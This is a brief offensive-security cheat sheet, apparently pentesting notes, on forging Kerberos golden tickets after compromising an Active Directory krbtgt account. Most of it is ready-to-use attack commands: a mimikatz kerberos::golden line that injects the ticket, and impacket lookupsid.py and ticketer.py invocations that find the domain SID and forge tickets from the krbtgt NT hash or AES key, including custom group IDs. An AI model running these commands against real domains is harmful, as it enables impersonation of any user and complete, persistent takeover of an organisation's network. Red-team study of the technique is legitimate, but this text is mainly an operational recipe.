

- What is it?
	- When we compromise the krbtgt account, we own the domain
	- We can request access t any resource or system on the domain
	- Golden tickets == complete access to every machine
- requirements
	- SID of the domain
	- hash of the account we want to impersonate



### On Windows
```
# with an NT hash
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:$UserYouWannaImpersonate /id:$UserId /ptt
```

```
misc::cmd
```



### On linux

```
# Find the domain SID
lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0

# Create the golden ticket (with an RC4 key, i.e. NT hash)
ticketer.py -nthash $krbtgtNThash -domain-sid $domainSID -domain $DOMAIN randomuser

# Create the golden ticket (with an AES 128/256bits key)
ticketer.py -aesKey $krbtgtAESkey -domain-sid $domainSID -domain $DOMAIN randomuser

# Create the golden ticket (with an RC4 key, i.e. NT hash) with custom user/groups ids
ticketer.py -nthash $krbtgtNThash -domain-sid $domainSID -domain $DOMAIN -user-id $USERID -groups $GROUPID1,$GROUPID2,... randomuser
```





----



